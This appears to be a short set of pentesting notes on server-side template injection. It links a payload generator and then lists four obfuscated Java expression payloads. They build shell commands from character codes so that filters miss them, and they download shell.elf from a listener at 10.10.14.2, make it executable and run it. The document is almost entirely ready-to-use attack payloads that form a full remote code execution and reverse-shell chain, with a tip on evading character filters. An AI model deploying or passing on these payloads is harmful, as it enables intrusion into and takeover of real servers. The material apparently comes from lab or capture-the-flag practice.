## SSTI

There are a number of sites out there that help provide payloads, but there were two resources that significantly helped me.

- [SSTI Payload Generator]('https://github.com/VikasVarshney/ssti-payload.git')

The biggest caveat for using this tool, is to know what the language character allow/deny list looks like.  Often, $ will be denied, so we can use # or * instead.

## Wget Payload
```
Command ==> wget http://10.10.14.2:8000/shell.elf -O /dev/shm/shell.elf
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(102))).getInputStream())}
```

## List Contents Payload
```
Command ==> ls -lah /dev/shm
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(109))).getInputStream())}
```

## Chmod File Payload
```
Command ==> chmod +x /dev/shm/shell.elf
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(102))).getInputStream())}
```

## Bash -c Payload
```
Command ==> bash -c /dev/shm/shell.elf
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(102))).getInputStream())}
```